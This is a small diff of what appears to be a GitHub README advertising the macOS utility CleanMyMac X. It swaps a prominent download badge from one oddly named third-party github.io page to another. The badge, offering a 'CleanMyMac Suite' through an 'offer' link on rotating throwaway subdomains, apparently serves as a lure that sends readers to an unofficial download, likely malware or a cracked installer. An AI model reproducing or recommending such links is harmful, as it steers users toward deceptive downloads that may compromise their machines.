@@ -3,7 +3,7 @@
 **CleanMyMac X** by *MacPaw* is an all-in-one performance and maintenance toolkit designed exclusively for **macOS**.  
 It scans your entire system, removes clutter, monitors performance, and keeps your Mac running as smoothly as day one. 🧼  
 
-[![💗 Get GitHub Instruction](https://img.shields.io/badge/💗%20Get%20CleanMyMac%20Suite-FF4081?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://app-dep-load.github.io/.github/?offer=CleanMyMacMac)
+[![💗 Get GitHub Instruction](https://img.shields.io/badge/💗%20Get%20CleanMyMac%20Suite-FF4081?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://hubset-desk.github.io/.github/?offer=CleanMyMacMac)
 
 ---
 
